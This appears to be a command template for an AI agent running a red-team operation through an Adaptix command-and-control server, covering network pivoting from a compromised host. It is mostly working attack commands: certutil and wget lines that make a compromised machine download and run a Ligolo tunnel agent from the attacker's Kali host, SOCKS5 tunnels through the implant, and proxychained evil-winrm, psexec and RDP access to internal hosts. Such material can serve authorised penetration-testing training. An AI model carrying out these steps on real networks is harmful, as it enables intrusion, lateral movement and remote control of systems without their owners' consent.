Set up a network pivot for a new subnet or compromised host. $ARGUMENTS = new subnet CIDR and/or agent_id if Adaptix agent is already on the host.

Two methods — Ligolo-ng (preferred, creates TUN interface, no proxychains) and Adaptix SOCKS5 (quick fallback when Ligolo agent can't be deployed).

---

## METHOD A: Ligolo-ng (preferred — no proxychains needed)

### A1: Deploy Ligolo agent via Adaptix MCP
If you have an Adaptix agent on the pivot host, deploy Ligolo through it:

**Windows:**
```
execute_command(agent_id, "shell certutil -urlcache -split -f http://KALI_IP:8000/ligolo-agent.exe C:\\Windows\\Temp\\lga.exe")
get_task_output(agent_id)   ← wait for download to complete

execute_command(agent_id, "shell C:\\Windows\\Temp\\lga.exe -connect KALI_IP:11601 -ignore-cert")
get_task_output(agent_id)   ← confirm running
```

**Linux:**
```
execute_command(agent_id, "shell wget http://KALI_IP:8000/ligolo-agent -O /tmp/lga && chmod +x /tmp/lga && /tmp/lga -connect KALI_IP:11601 -ignore-cert &")
get_task_output(agent_id)
```

### A2: Activate tunnel in Ligolo console (Kali)
```
ligolo-ng >> session    ← select the new agent
ligolo-ng >> start      ← activate TUN interface (tun0 / ligolo)
```

### A3: Add route on Kali for the new subnet
```bash
sudo ip route add <NEW_SUBNET> dev ligolo

# Verify
ip route | grep ligolo
ping -c 2 <INTERNAL_IP>
```

### A4: Double pivot (pivot through first agent)
```
# In Ligolo console on FIRST session:
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11602

# Second host: connect to FIRST pivot host's IP:11601
execute_command(second_agent_id, "shell .\\lga.exe -connect PIVOT_HOST_IP:11601 -ignore-cert")

# Kali: new routes use ligolo interface automatically
sudo ip route add <SECOND_SUBNET> dev ligolo
```

---

## METHOD B: Adaptix SOCKS5 (quick fallback — needs proxychains)

⚠️ **CRITICAL: sleep must be 0 before creating SOCKS5 tunnel or it will not work.**

```
# Step 1: REQUIRED — set sleep to 0 first
set_sleep(agent_id, 0)
get_task_output(agent_id)   ← confirm sleep set

# Step 2: Start SOCKS5 proxy
start_socks5(agent_id, port=1080, desc="pivot-chain1")

# Step 3: Verify tunnel created
list_tunnels()
```

Add to `/etc/proxychains4.conf`:
```
socks5 127.0.0.1 1080
```

Use tools:
```bash
proxychains4 nmap -sT -Pn <INTERNAL_IP>
proxychains4 evil-winrm -i <INTERNAL_IP> -u user -p pass
proxychains4 impacket-psexec DOMAIN/user@INTERNAL_IP
```

Stop when done:
```
list_tunnels()               ← get tunnel_id
stop_tunnel(tunnel_id)
```

---

## METHOD C: Port forward via Adaptix (specific service)

When you need to reach one specific port on an internal host:
```
start_port_forward(
  agent_id=agent_id,
  local_port=13389,       ← port on Kali
  target_host="10.10.10.5",
  target_port=3389,       ← RDP on internal host
  desc="RDP-to-internal"
)
```
Then: `xfreerdp3 /v:127.0.0.1:13389 /u:Administrator /p:password`

---

## Step: Update tunnel map
Append to ~/osai/current/state/tunnel_map.md:
```markdown
| Method | Agent/Host | New Subnet | Command | Time |
|--------|-----------|------------|---------|------|
| Ligolo | <HOST> | <SUBNET> | sudo ip route add <SUBNET> dev ligolo | <TIME> |
| SOCKS5 | <AGENT_ID> | <SUBNET> | socks5 127.0.0.1:1080 | <TIME> |
```

## Step: Sync new host to Adaptix targets
```
add_target(hostname="<HOSTNAME>", address="<IP>", domain="<DOMAIN>", tag="chain1-internal")
```

## Verification checklist
- [ ] `ip route | grep ligolo` shows the new subnet (Ligolo method)
- [ ] OR `list_tunnels()` shows active SOCKS5 (Adaptix method)
- [ ] Can reach an internal IP through the pivot
- [ ] `tunnel_map.md` updated
- [ ] Target added to Adaptix via `add_target()`
